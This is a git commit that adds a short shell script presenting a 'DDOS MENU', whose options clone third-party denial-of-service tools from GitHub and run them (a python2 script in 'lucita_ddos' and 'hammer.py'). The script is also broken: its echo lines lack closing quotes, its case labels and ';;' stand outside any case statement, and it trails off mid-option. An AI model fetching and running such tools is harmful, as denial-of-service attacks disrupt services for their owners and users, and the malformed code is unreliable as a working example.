3730dd213946b7314fa8cf0987de0d8b2eab055e
ShineCyber <59771547+ShineCyber@users.noreply.github.com>
2020-01-20 17:52:11 +0700

    Create f91d4f236d5a13c1887ff4d69a216200.sh

---
+++ f91d4f236d5a13c1887ff4d69a216200.sh
@@ -0,0 +1,20 @@
+echo '\033[1;35m╔══════╗╔═════════════════════════════╗╔══════╗
+echo '\033[1;35m║ {01} ║║       {DDOS MENU}           ║║ {ON} ║
+echo '\033[1;35m╚══════╝╚═════════════════════════════╝╚══════╝
+
+1).Lucita ddos
+clear
+git clone https://github.com/zlucifer
+cd lucita_ddos
+clear
+python2 pukul.py
+;;
+2.Hammer
+clear
+git clone https://github.com/cyweb/hammer
+cd hammer
+chmod +x hammer.py
+clear
+./hammer.py
+;;
+3)OTW gan...
